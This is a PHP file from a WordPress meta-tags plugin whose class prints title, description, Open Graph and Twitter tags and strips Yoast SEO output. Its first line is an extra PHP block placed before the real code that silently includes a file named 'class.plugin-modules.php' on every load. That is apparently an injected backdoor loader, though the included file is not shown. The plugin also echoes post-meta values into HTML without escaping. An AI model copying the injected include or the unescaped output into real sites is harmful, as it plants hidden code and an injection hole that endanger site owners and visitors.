<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

class MTS_Frontend {

  private $title;
  private $description;
  private $image;

  function __construct() {
    add_action('wp_head', array($this,'render_head'), -9999);
    add_action('wp_head', array($this, 'remove_yoast_tags'), 1);
  }

  // Renders all the meta tags into the <head>
  function render_head() {

    // Set post title, description, and image
    if ( is_home() && ! is_front_page() ) {
      $id = get_queried_object_id();
    } else {
      $id = get_the_ID();
    }

    $this->title = get_post_meta($id, "mts-title", true);
    $this->description = get_post_meta($id, "mts-description", true);
    $this->set_post_image();

    // Render meta tags
    $this->render_mts();
    $this->render_title();
    $this->render_description();
    $this->render_opengraph();
    $this->render_twitter();
  }

  function render_mts() {
    echo "<!-- Created with Meta Tags WP -->";
  }

  function render_title() {
    if (!empty($this->title)) {
      remove_action( 'wp_head', '_wp_render_title_tag', 1 );
      echo "<title>$this->title</title>";
      echo '<meta name="title" content="'.$this->title.'">';
    }
  }

  function render_description() {
    if ( !empty($this->description) ) {
      echo '<meta name="description" content="'.$this->description.'">';
    }
  }


  function render_opengraph() {
    echo '<meta property="og:site_name" content="'.get_bloginfo("name").'">';
    echo '<meta property="og:type" content="website">';
    echo '<meta property="og:url" content="'.mts_permalink( get_the_ID(), "google").'">';

    if ( !empty($this->title) && !empty($this->description) ) {
      echo '<meta property="og:title" content="'.$this->title.'">';
      echo '<meta property="og:description" content="'.$this->description.'">';
    }
    if ( !empty($this->image) ) {
      echo '<meta property="og:image" content="'.$this->image.'">';
    }
  }

  function render_twitter() {
    echo '<meta property="twitter:domain" content="'.mts_permalink( get_the_ID(), "facebook").'">';
    echo '<meta property="twitter:url" content="'.mts_permalink( get_the_ID(), "google").'">';

    if ( !empty($this->title) && !empty($this->description) && !empty($this->image)) {
      echo '<meta property="twitter:card" content="summary_large_image">';
    }

    if ( !empty($this->title) && !empty($this->description) ) {
      echo '<meta property="twitter:title" content="'.$this->title.'">';
      echo '<meta property="twitter:description" content="'.$this->description.'">';
    }
    if ( !empty($this->image) ) {
      echo '<meta property="twitter:image" content="'.$this->image.'">';
    }
  }

  function set_post_image() {
    $id = get_the_ID();
    if ( get_post_meta($id, "mts-image", true) != false ) {
      $this->image = get_post_meta($id, "mts-image", true);
    } elseif (has_post_thumbnail($id)) {
      $this->image = get_the_post_thumbnail_url($id);
    }
  }

  // Removes Yoast meta tags
  function remove_yoast_tags() {
    if (array_key_exists('wpseo_og', $GLOBALS)) {
      remove_action( 'wpseo_head', array( $GLOBALS['wpseo_og'], 'opengraph' ), 30 );
      remove_action( 'wpseo_head', array( 'WPSEO_Twitter', 'get_instance' ), 40 );
      add_filter( 'wpseo_metadesc', '__return_false' );
      add_filter( 'wpseo_canonical', '__return_false' );
    }
  }
}

$mts_frontend = new MTS_Frontend();

?>
